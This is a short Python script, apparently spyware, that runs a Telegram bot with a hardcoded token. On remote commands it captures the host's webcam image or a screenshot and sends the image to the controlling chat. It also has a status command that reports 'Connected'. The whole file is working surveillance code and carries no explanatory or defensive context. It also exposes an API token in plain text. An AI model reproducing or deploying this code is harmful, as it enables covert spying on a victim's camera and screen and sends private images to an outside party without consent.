import pyautogui
import cv2
import telebot
import os
import os.path
import random
bot = telebot.TeleBot("1334401569:AAF72wWqcQjpCY7o-BcfKfV420tBcqnXM0g")
@bot.message_handler(content_types=['text'])
def message_photo(message):
	if message.text == "/photo":
		i = random.randint(1, 5000)
		try:
			videoCaptureObject = cv2.VideoCapture(0)
			result = True
			while(result):
				ret,frame = videoCaptureObject.read()
				cv2.imwrite("NewPicture"+str(i)+".jpg",frame)
				result = False
			videoCaptureObject.release()
			cv2.destroyAllWindows()
			photo = open("NewPicture"+str(i)+".jpg", "rb")
			bot.send_photo(message.chat.id, photo)
			scr = os.path.isfile("NewPicture"+str(i)+".jpg")
		except:
			bot.send_message(message.chat.id, "WebCam not found")
	elif message.text == "/screen":
		i = random.randint(1, 5000)
		scr = os.path.isfile("screenshot"+str(i)+".png")
		pyautogui.screenshot("screenshot"+str(i)+".png")
		screen = open("screenshot"+str(i)+".png", "rb")
		bot.send_photo(message.chat.id, screen)	
		pyautogui.screenshot("screenshot"+str(i)+".png")
	elif message.text == "/online":
		bot.send_message(message.chat.id, "Connected")
bot.polling(none_stop=True)
